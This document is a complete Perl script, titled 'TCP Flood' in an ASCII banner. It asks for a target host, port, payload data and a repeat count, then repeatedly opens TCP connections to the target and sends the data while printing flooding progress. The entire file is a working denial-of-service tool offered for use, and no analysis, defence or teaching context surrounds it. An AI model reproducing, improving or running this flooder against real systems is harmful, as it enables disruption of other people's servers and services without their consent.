#!/usr/bin/perl
use IO::Socket;
print q{
 __________  ____  _____
|____  ____|/ ___||  _  |
    |  |   / /    |   __|
    |  |  (  \___ |  |
    |__|   \_____||__| 
 _________  __                     _
\_   _____/|  |   ____   ____   __| |
 |    __)  |  |  /  _ \ /  _ \ / __ | 
 |   |     |  |_(  <_> |  <_> ) /_/ | 
 \___|     |____/\____/ \____/\_____| 
                with data sending.                               
 
 
};
 
 
print "Host : ";
$serv = <stdin>;
chop ($serv);
 
print "Port : ";
$port = <stdin>;
chop ($port);
 
print "Data :";
$data = <stdin>;
chop($data);
 
print "Times To Flood : ";
$times = <stdin>;
chop ($times);
 
 
for ($i=0; $i<$times; $i++)
{
$flood = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$serv", PeerPort => "$port") || print "[*] Server Down!\n";
print $flood $data;
syswrite STDOUT, "[*] Flooding - ".$i."\n";
}
 
print "[*] End of flood.\n";